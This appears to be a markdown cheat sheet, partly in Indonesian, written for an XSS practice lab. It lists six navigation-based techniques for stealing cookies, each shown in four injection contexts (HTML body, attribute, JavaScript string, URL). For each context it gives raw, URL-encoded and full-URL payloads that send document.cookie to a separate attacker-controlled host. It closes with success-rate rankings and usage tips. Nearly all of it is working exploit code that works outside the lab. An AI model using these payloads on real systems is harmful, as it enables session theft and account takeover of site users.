@@ -1,0 +1,672 @@
+# Context-Based XSS Payloads - Navigation Exfiltration
+
+> **Lab URL**: `https://pzcihwu2.xssy.uk/target.ftl?name=`  
+> **Attacker Server**: `https://eqh42jmm.xssy.uk`
+
+---
+
+
+## Teknik 1: Meta Refresh Redirect
+
+### 📌 Konteks 1: HTML Body
+
+**Vulnerable Code:**
+```html
+<div>USER_INPUT</div>
+```
+
+**Raw Payload:**
+```html
+<script>
+var meta=document.createElement('meta');
+meta.httpEquiv='refresh';
+meta.content='0;url=https://eqh42jmm.xssy.uk/?c='+document.cookie;
+document.head.appendChild(meta);
+</script>
+```
+
+**URL Encoded:**
+```
+%3Cscript%3Evar%20meta%3Ddocument.createElement%28%27meta%27%29%3Bmeta.httpEquiv%3D%27refresh%27%3Bmeta.content%3D%270%3Burl%3Dhttps%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3Bdocument.head.appendChild%28meta%29%3B%3C%2Fscript%3E
+```
+
+**Full Lab URL:**
+```
+https://pzcihwu2.xssy.uk/target.ftl?name=%3Cscript%3Evar%20meta%3Ddocument.createElement%28%27meta%27%29%3Bmeta.httpEquiv%3D%27refresh%27%3Bmeta.content%3D%270%3Burl%3Dhttps%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3Bdocument.head.appendChild%28meta%29%3B%3C%2Fscript%3E
+```
+
+**Alternative (Event Handler):**
+```html
+<img src=x onerror="var meta=document.createElement('meta');meta.httpEquiv='refresh';meta.content='0;url=https://eqh42jmm.xssy.uk/?c='+document.cookie;document.head.appendChild(meta)">
+```
+
+---
+
+### 📌 Konteks 2: HTML Attribute
+
+**Vulnerable Code:**
+```html
+<input value="USER_INPUT">
+```
+
+**Raw Payload:**
+```html
+" onfocus="var meta=document.createElement('meta');meta.httpEquiv='refresh';meta.content='0;url=https://eqh42jmm.xssy.uk/?c='+document.cookie;document.head.appendChild(meta)" autofocus="
+```
+
+**URL Encoded:**
+```
+%22%20onfocus%3D%22var%20meta%3Ddocument.createElement%28%27meta%27%29%3Bmeta.httpEquiv%3D%27refresh%27%3Bmeta.content%3D%270%3Burl%3Dhttps%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3Bdocument.head.appendChild%28meta%29%22%20autofocus%3D%22
+```
+
+**Full Lab URL:**
+```
+https://pzcihwu2.xssy.uk/target.ftl?name=%22%20onfocus%3D%22var%20meta%3Ddocument.createElement%28%27meta%27%29%3Bmeta.httpEquiv%3D%27refresh%27%3Bmeta.content%3D%270%3Burl%3Dhttps%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3Bdocument.head.appendChild%28meta%29%22%20autofocus%3D%22
+```
+
+**Alternative (Close Tag):**
+```html
+"></input><img src=x onerror="var meta=document.createElement('meta');meta.httpEquiv='refresh';meta.content='0;url=https://eqh42jmm.xssy.uk/?c='+document.cookie;document.head.appendChild(meta)">
+```
+
+---
+
+### 📌 Konteks 3: JavaScript String
+
+**Vulnerable Code:**
+```html
+<script>
+var username = "USER_INPUT";
+</script>
+```
+
+**Raw Payload:**
+```javascript
+";var meta=document.createElement('meta');meta.httpEquiv='refresh';meta.content='0;url=https://eqh42jmm.xssy.uk/?c='+document.cookie;document.head.appendChild(meta);//
+```
+
+**URL Encoded:**
+```
+%22%3Bvar%20meta%3Ddocument.createElement%28%27meta%27%29%3Bmeta.httpEquiv%3D%27refresh%27%3Bmeta.content%3D%270%3Burl%3Dhttps%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3Bdocument.head.appendChild%28meta%29%3B%2F%2F
+```
+
+**Full Lab URL:**
+```
+https://pzcihwu2.xssy.uk/target.ftl?name=%22%3Bvar%20meta%3Ddocument.createElement%28%27meta%27%29%3Bmeta.httpEquiv%3D%27refresh%27%3Bmeta.content%3D%270%3Burl%3Dhttps%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3Bdocument.head.appendChild%28meta%29%3B%2F%2F
+```
+
+**Alternative (Single Quote):**
+```javascript
+';var meta=document.createElement('meta');meta.httpEquiv='refresh';meta.content='0;url=https://eqh42jmm.xssy.uk/?c='+document.cookie;document.head.appendChild(meta);//
+```
+
+---
+
+### 📌 Konteks 4: URL
+
+**Vulnerable Code:**
+```html
+<a href="USER_INPUT">Click</a>
+```
+
+**Raw Payload:**
+```javascript
+javascript:void(function(){var meta=document.createElement('meta');meta.httpEquiv='refresh';meta.content='0;url=https://eqh42jmm.xssy.uk/?c='+document.cookie;document.head.appendChild(meta)})()
+```
+
+**URL Encoded:**
+```
+javascript%3Avoid%28function%28%29%7Bvar%20meta%3Ddocument.createElement%28%27meta%27%29%3Bmeta.httpEquiv%3D%27refresh%27%3Bmeta.content%3D%270%3Burl%3Dhttps%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3Bdocument.head.appendChild%28meta%29%7D%29%28%29
+```
+
+**Full Lab URL:**
+```
+https://pzcihwu2.xssy.uk/target.ftl?name=javascript%3Avoid%28function%28%29%7Bvar%20meta%3Ddocument.createElement%28%27meta%27%29%3Bmeta.httpEquiv%3D%27refresh%27%3Bmeta.content%3D%270%3Burl%3Dhttps%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3Bdocument.head.appendChild%28meta%29%7D%29%28%29
+```
+
+---
+
+## Teknik 2: location / location.assign
+
+### 📌 Konteks 1: HTML Body
+
+**Vulnerable Code:**
+```html
+<div>USER_INPUT</div>
+```
+
+**Raw Payload:**
+```html
+<script>location='https://eqh42jmm.xssy.uk/?c='+document.cookie</script>
+```
+
+**URL Encoded:**
+```
+%3Cscript%3Elocation%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E
+```
+
+**Full Lab URL:**
+```
+https://pzcihwu2.xssy.uk/target.ftl?name=%3Cscript%3Elocation%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3C%2Fscript%3E
+```
+
+**Alternative (Event Handler):**
+```html
+<img src=x onerror="location='https://eqh42jmm.xssy.uk/?c='+document.cookie">
+```
+
+---
+
+### 📌 Konteks 2: HTML Attribute
+
+**Vulnerable Code:**
+```html
+<input value="USER_INPUT">
+```
+
+**Raw Payload:**
+```html
+" onfocus="location='https://eqh42jmm.xssy.uk/?c='+document.cookie" autofocus="
+```
+
+**URL Encoded:**
+```
+%22%20onfocus%3D%22location%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%22%20autofocus%3D%22
+```
+
+**Full Lab URL:**
+```
+https://pzcihwu2.xssy.uk/target.ftl?name=%22%20onfocus%3D%22location%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%22%20autofocus%3D%22
+```
+
+**Alternative (onclick):**
+```html
+" onclick="location='https://eqh42jmm.xssy.uk/?c='+document.cookie" x="
+```
+
+---
+
+### 📌 Konteks 3: JavaScript String
+
+**Vulnerable Code:**
+```html
+<script>
+var data = "USER_INPUT";
+</script>
+```
+
+**Raw Payload:**
+```javascript
+";location='https://eqh42jmm.xssy.uk/?c='+document.cookie;//
+```
+
+**URL Encoded:**
+```
+%22%3Blocation%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3B%2F%2F
+```
+
+**Full Lab URL:**
+```
+https://pzcihwu2.xssy.uk/target.ftl?name=%22%3Blocation%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3B%2F%2F
+```
+
+**Alternative (location.assign):**
+```javascript
+";location.assign('https://eqh42jmm.xssy.uk/?c='+document.cookie);//
+```
+
+---
+
+### 📌 Konteks 4: URL
+
+**Vulnerable Code:**
+```html
+<a href="USER_INPUT">Link</a>
+```
+
+**Raw Payload:**
+```javascript
+javascript:location='https://eqh42jmm.xssy.uk/?c='+document.cookie
+```
+
+**URL Encoded:**
+```
+javascript%3Alocation%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie
+```
+
+**Full Lab URL:**
+```
+https://pzcihwu2.xssy.uk/target.ftl?name=javascript%3Alocation%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie
+```
+
+---
+
+## Teknik 3: Anchor Tag Auto-Click
+
+### 📌 Konteks 1: HTML Body
+
+**Vulnerable Code:**
+```html
+<div>USER_INPUT</div>
+```
+
+**Raw Payload:**
+```html
+<script>var a=document.createElement('a');a.href='https://eqh42jmm.xssy.uk/?c='+document.cookie;document.body.appendChild(a);a.click()</script>
+```
+
+**URL Encoded:**
+```
+%3Cscript%3Evar%20a%3Ddocument.createElement%28%27a%27%29%3Ba.href%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3Bdocument.body.appendChild%28a%29%3Ba.click%28%29%3C%2Fscript%3E
+```
+
+**Full Lab URL:**
+```
+https://pzcihwu2.xssy.uk/target.ftl?name=%3Cscript%3Evar%20a%3Ddocument.createElement%28%27a%27%29%3Ba.href%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3Bdocument.body.appendChild%28a%29%3Ba.click%28%29%3C%2Fscript%3E
+```
+
+**Alternative (Event Handler):**
+```html
+<img src=x onerror="var a=document.createElement('a');a.href='https://eqh42jmm.xssy.uk/?c='+document.cookie;document.body.appendChild(a);a.click()">
+```
+
+---
+
+### 📌 Konteks 2: HTML Attribute
+
+**Vulnerable Code:**
+```html
+<input value="USER_INPUT">
+```
+
+**Raw Payload:**
+```html
+" onfocus="var a=document.createElement('a');a.href='https://eqh42jmm.xssy.uk/?c='+document.cookie;document.body.appendChild(a);a.click()" autofocus="
+```
+
+**URL Encoded:**
+```
+%22%20onfocus%3D%22var%20a%3Ddocument.createElement%28%27a%27%29%3Ba.href%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3Bdocument.body.appendChild%28a%29%3Ba.click%28%29%22%20autofocus%3D%22
+```
+
+**Full Lab URL:**
+```
+https://pzcihwu2.xssy.uk/target.ftl?name=%22%20onfocus%3D%22var%20a%3Ddocument.createElement%28%27a%27%29%3Ba.href%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3Bdocument.body.appendChild%28a%29%3Ba.click%28%29%22%20autofocus%3D%22
+```
+
+---
+
+### 📌 Konteks 3: JavaScript String
+
+**Vulnerable Code:**
+```html
+<script>
+var name = "USER_INPUT";
+</script>
+```
+
+**Raw Payload:**
+```javascript
+";var a=document.createElement('a');a.href='https://eqh42jmm.xssy.uk/?c='+document.cookie;document.body.appendChild(a);a.click();//
+```
+
+**URL Encoded:**
+```
+%22%3Bvar%20a%3Ddocument.createElement%28%27a%27%29%3Ba.href%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3Bdocument.body.appendChild%28a%29%3Ba.click%28%29%3B%2F%2F
+```
+
+**Full Lab URL:**
+```
+https://pzcihwu2.xssy.uk/target.ftl?name=%22%3Bvar%20a%3Ddocument.createElement%28%27a%27%29%3Ba.href%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3Bdocument.body.appendChild%28a%29%3Ba.click%28%29%3B%2F%2F
+```
+
+---
+
+### 📌 Konteks 4: URL
+
+**Vulnerable Code:**
+```html
+<a href="USER_INPUT">Link</a>
+```
+
+**Raw Payload:**
+```javascript
+javascript:void(function(){var a=document.createElement('a');a.href='https://eqh42jmm.xssy.uk/?c='+document.cookie;document.body.appendChild(a);a.click()})()
+```
+
+**URL Encoded:**
+```
+javascript%3Avoid%28function%28%29%7Bvar%20a%3Ddocument.createElement%28%27a%27%29%3Ba.href%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3Bdocument.body.appendChild%28a%29%3Ba.click%28%29%7D%29%28%29
+```
+
+**Full Lab URL:**
+```
+https://pzcihwu2.xssy.uk/target.ftl?name=javascript%3Avoid%28function%28%29%7Bvar%20a%3Ddocument.createElement%28%27a%27%29%3Ba.href%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3Bdocument.body.appendChild%28a%29%3Ba.click%28%29%7D%29%28%29
+```
+
+---
+
+## Teknik 4: Form GET Submission
+
+### 📌 Konteks 1: HTML Body
+
+**Vulnerable Code:**
+```html
+<div>USER_INPUT</div>
+```
+
+**Raw Payload:**
+```html
+<script>var f=document.createElement('form');f.method='GET';f.action='https://eqh42jmm.xssy.uk/';var i=document.createElement('input');i.name='c';i.value=document.cookie;f.appendChild(i);document.body.appendChild(f);f.submit()</script>
+```
+
+**URL Encoded:**
+```
+%3Cscript%3Evar%20f%3Ddocument.createElement%28%27form%27%29%3Bf.method%3D%27GET%27%3Bf.action%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%27%3Bvar%20i%3Ddocument.createElement%28%27input%27%29%3Bi.name%3D%27c%27%3Bi.value%3Ddocument.cookie%3Bf.appendChild%28i%29%3Bdocument.body.appendChild%28f%29%3Bf.submit%28%29%3C%2Fscript%3E
+```
+
+**Full Lab URL:**
+```
+https://pzcihwu2.xssy.uk/target.ftl?name=%3Cscript%3Evar%20f%3Ddocument.createElement%28%27form%27%29%3Bf.method%3D%27GET%27%3Bf.action%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%27%3Bvar%20i%3Ddocument.createElement%28%27input%27%29%3Bi.name%3D%27c%27%3Bi.value%3Ddocument.cookie%3Bf.appendChild%28i%29%3Bdocument.body.appendChild%28f%29%3Bf.submit%28%29%3C%2Fscript%3E
+```
+
+---
+
+### 📌 Konteks 2: HTML Attribute
+
+**Vulnerable Code:**
+```html
+<input value="USER_INPUT">
+```
+
+**Raw Payload:**
+```html
+" onfocus="var f=document.createElement('form');f.method='GET';f.action='https://eqh42jmm.xssy.uk/';var i=document.createElement('input');i.name='c';i.value=document.cookie;f.appendChild(i);document.body.appendChild(f);f.submit()" autofocus="
+```
+
+**URL Encoded:**
+```
+%22%20onfocus%3D%22var%20f%3Ddocument.createElement%28%27form%27%29%3Bf.method%3D%27GET%27%3Bf.action%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%27%3Bvar%20i%3Ddocument.createElement%28%27input%27%29%3Bi.name%3D%27c%27%3Bi.value%3Ddocument.cookie%3Bf.appendChild%28i%29%3Bdocument.body.appendChild%28f%29%3Bf.submit%28%29%22%20autofocus%3D%22
+```
+
+**Full Lab URL:**
+```
+https://pzcihwu2.xssy.uk/target.ftl?name=%22%20onfocus%3D%22var%20f%3Ddocument.createElement%28%27form%27%29%3Bf.method%3D%27GET%27%3Bf.action%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%27%3Bvar%20i%3Ddocument.createElement%28%27input%27%29%3Bi.name%3D%27c%27%3Bi.value%3Ddocument.cookie%3Bf.appendChild%28i%29%3Bdocument.body.appendChild%28f%29%3Bf.submit%28%29%22%20autofocus%3D%22
+```
+
+---
+
+### 📌 Konteks 3: JavaScript String
+
+**Vulnerable Code:**
+```html
+<script>
+var user = "USER_INPUT";
+</script>
+```
+
+**Raw Payload:**
+```javascript
+";var f=document.createElement('form');f.method='GET';f.action='https://eqh42jmm.xssy.uk/';var i=document.createElement('input');i.name='c';i.value=document.cookie;f.appendChild(i);document.body.appendChild(f);f.submit();//
+```
+
+**URL Encoded:**
+```
+%22%3Bvar%20f%3Ddocument.createElement%28%27form%27%29%3Bf.method%3D%27GET%27%3Bf.action%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%27%3Bvar%20i%3Ddocument.createElement%28%27input%27%29%3Bi.name%3D%27c%27%3Bi.value%3Ddocument.cookie%3Bf.appendChild%28i%29%3Bdocument.body.appendChild%28f%29%3Bf.submit%28%29%3B%2F%2F
+```
+
+**Full Lab URL:**
+```
+https://pzcihwu2.xssy.uk/target.ftl?name=%22%3Bvar%20f%3Ddocument.createElement%28%27form%27%29%3Bf.method%3D%27GET%27%3Bf.action%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%27%3Bvar%20i%3Ddocument.createElement%28%27input%27%29%3Bi.name%3D%27c%27%3Bi.value%3Ddocument.cookie%3Bf.appendChild%28i%29%3Bdocument.body.appendChild%28f%29%3Bf.submit%28%29%3B%2F%2F
+```
+
+---
+
+### 📌 Konteks 4: URL
+
+**Vulnerable Code:**
+```html
+<a href="USER_INPUT">Link</a>
+```
+
+**Raw Payload:**
+```javascript
+javascript:void(function(){var f=document.createElement('form');f.method='GET';f.action='https://eqh42jmm.xssy.uk/';var i=document.createElement('input');i.name='c';i.value=document.cookie;f.appendChild(i);document.body.appendChild(f);f.submit()})()
+```
+
+**URL Encoded:**
+```
+javascript%3Avoid%28function%28%29%7Bvar%20f%3Ddocument.createElement%28%27form%27%29%3Bf.method%3D%27GET%27%3Bf.action%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%27%3Bvar%20i%3Ddocument.createElement%28%27input%27%29%3Bi.name%3D%27c%27%3Bi.value%3Ddocument.cookie%3Bf.appendChild%28i%29%3Bdocument.body.appendChild%28f%29%3Bf.submit%28%29%7D%29%28%29
+```
+
+**Full Lab URL:**
+```
+https://pzcihwu2.xssy.uk/target.ftl?name=javascript%3Avoid%28function%28%29%7Bvar%20f%3Ddocument.createElement%28%27form%27%29%3Bf.method%3D%27GET%27%3Bf.action%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%27%3Bvar%20i%3Ddocument.createElement%28%27input%27%29%3Bi.name%3D%27c%27%3Bi.value%3Ddocument.cookie%3Bf.appendChild%28i%29%3Bdocument.body.appendChild%28f%29%3Bf.submit%28%29%7D%29%28%29
+```
+
+---
+
+## Teknik 5: window.open()
+
+### 📌 Konteks 1: HTML Body
+
+**Vulnerable Code:**
+```html
+<div>USER_INPUT</div>
+```
+
+**Raw Payload:**
+```html
+<script>window.open('https://eqh42jmm.xssy.uk/?c='+document.cookie)</script>
+```
+
+**URL Encoded:**
+```
+%3Cscript%3Ewindow.open%28%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E
+```
+
+**Full Lab URL:**
+```
+https://pzcihwu2.xssy.uk/target.ftl?name=%3Cscript%3Ewindow.open%28%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%29%3C%2Fscript%3E
+```
+
+**⚠️ Note:** Teknik ini sering diblokir oleh popup blocker!
+
+---
+
+### 📌 Konteks 2: HTML Attribute
+
+**Vulnerable Code:**
+```html
+<input value="USER_INPUT">
+```
+
+**Raw Payload:**
+```html
+" onclick="window.open('https://eqh42jmm.xssy.uk/?c='+document.cookie)" x="
+```
+
+**URL Encoded:**
+```
+%22%20onclick%3D%22window.open%28%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%29%22%20x%3D%22
+```
+
+**Full Lab URL:**
+```
+https://pzcihwu2.xssy.uk/target.ftl?name=%22%20onclick%3D%22window.open%28%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%29%22%20x%3D%22
+```
+
+---
+
+### 📌 Konteks 3: JavaScript String
+
+**Vulnerable Code:**
+```html
+<script>
+var data = "USER_INPUT";
+</script>
+```
+
+**Raw Payload:**
+```javascript
+";window.open('https://eqh42jmm.xssy.uk/?c='+document.cookie);//
+```
+
+**URL Encoded:**
+```
+%22%3Bwindow.open%28%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%29%3B%2F%2F
+```
+
+**Full Lab URL:**
+```
+https://pzcihwu2.xssy.uk/target.ftl?name=%22%3Bwindow.open%28%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%29%3B%2F%2F
+```
+
+---
+
+### 📌 Konteks 4: URL
+
+**Vulnerable Code:**
+```html
+<a href="USER_INPUT">Link</a>
+```
+
+**Raw Payload:**
+```javascript
+javascript:window.open('https://eqh42jmm.xssy.uk/?c='+document.cookie)
+```
+
+**URL Encoded:**
+```
+javascript%3Awindow.open%28%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%29
+```
+
+**Full Lab URL:**
+```
+https://pzcihwu2.xssy.uk/target.ftl?name=javascript%3Awindow.open%28%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%29
+```
+
+---
+
+## Teknik 6: iframe src
+
+### 📌 Konteks 1: HTML Body
+
+**Vulnerable Code:**
+```html
+<div>USER_INPUT</div>
+```
+
+**Raw Payload:**
+```html
+<script>var iframe=document.createElement('iframe');iframe.src='https://eqh42jmm.xssy.uk/?c='+document.cookie;iframe.style.display='none';document.body.appendChild(iframe)</script>
+```
+
+**URL Encoded:**
+```
+%3Cscript%3Evar%20iframe%3Ddocument.createElement%28%27iframe%27%29%3Biframe.src%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3Biframe.style.display%3D%27none%27%3Bdocument.body.appendChild%28iframe%29%3C%2Fscript%3E
+```
+
+**Full Lab URL:**
+```
+https://pzcihwu2.xssy.uk/target.ftl?name=%3Cscript%3Evar%20iframe%3Ddocument.createElement%28%27iframe%27%29%3Biframe.src%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3Biframe.style.display%3D%27none%27%3Bdocument.body.appendChild%28iframe%29%3C%2Fscript%3E
+```
+
+**⚠️ Note:** Kemungkinan diblokir oleh `default-src 'none'` di CSP lab!
+
+---
+
+### 📌 Konteks 2: HTML Attribute
+
+**Vulnerable Code:**
+```html
+<input value="USER_INPUT">
+```
+
+**Raw Payload:**
+```html
+" onfocus="var iframe=document.createElement('iframe');iframe.src='https://eqh42jmm.xssy.uk/?c='+document.cookie;iframe.style.display='none';document.body.appendChild(iframe)" autofocus="
+```
+
+**URL Encoded:**
+```
+%22%20onfocus%3D%22var%20iframe%3Ddocument.createElement%28%27iframe%27%29%3Biframe.src%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3Biframe.style.display%3D%27none%27%3Bdocument.body.appendChild%28iframe%29%22%20autofocus%3D%22
+```
+
+**Full Lab URL:**
+```
+https://pzcihwu2.xssy.uk/target.ftl?name=%22%20onfocus%3D%22var%20iframe%3Ddocument.createElement%28%27iframe%27%29%3Biframe.src%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3Biframe.style.display%3D%27none%27%3Bdocument.body.appendChild%28iframe%29%22%20autofocus%3D%22
+```
+
+---
+
+### 📌 Konteks 3: JavaScript String
+
+**Vulnerable Code:**
+```html
+<script>
+var url = "USER_INPUT";
+</script>
+```
+
+**Raw Payload:**
+```javascript
+";var iframe=document.createElement('iframe');iframe.src='https://eqh42jmm.xssy.uk/?c='+document.cookie;iframe.style.display='none';document.body.appendChild(iframe);//
+```
+
+**URL Encoded:**
+```
+%22%3Bvar%20iframe%3Ddocument.createElement%28%27iframe%27%29%3Biframe.src%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3Biframe.style.display%3D%27none%27%3Bdocument.body.appendChild%28iframe%29%3B%2F%2F
+```
+
+**Full Lab URL:**
+```
+https://pzcihwu2.xssy.uk/target.ftl?name=%22%3Bvar%20iframe%3Ddocument.createElement%28%27iframe%27%29%3Biframe.src%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bdocument.cookie%3Biframe.style.display%3D%27none%27%3Bdocument.body.appendChild%28iframe%29%3B%2F%2F
+```
+
+---
+
+### 📌 Konteks 4: URL
+
+**Vulnerable Code:**
+```html
+<iframe src="USER_INPUT"></iframe>
+```
+
+**Raw Payload:**
+```javascript
+javascript:parent.location='https://eqh42jmm.xssy.uk/?c='+parent.document.cookie
+```
+
+**URL Encoded:**
+```
+javascript%3Aparent.location%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bparent.document.cookie
+```
+
+**Full Lab URL:**
+```
+https://pzcihwu2.xssy.uk/target.ftl?name=javascript%3Aparent.location%3D%27https%3A%2F%2Feqh42jmm.xssy.uk%2F%3Fc%3D%27%2Bparent.document.cookie
+```
+
+---
+
+## Rekomendasi Berdasarkan Success Rate
+
+1. **Meta Refresh** - Success rate tertinggi (~95%)
+2. **location redirect** - Paling simple (~90%)
+3. **Anchor auto-click** - Reliable (~85%)
+4. **Form submission** - Jika form-action tidak diblock (~70%)
+5. **window.open** - Sering kena popup blocker (~20%)
+6. **iframe src** - Sering diblock CSP (~40%)
+
+## Best Practice
+
+1. ✅ Deteksi konteks terlebih dahulu
+2. ✅ Pilih teknik sesuai konteks
+3. ✅ URL encode semua payload
+4. ✅ Encode cookie data dengan encodeURIComponent()
+5. ✅ Test di environment sendiri dulu
+6. ✅ Monitor server logs untuk verify
+7. ✅ Submit URL (bukan flag) ke lab
+
+---
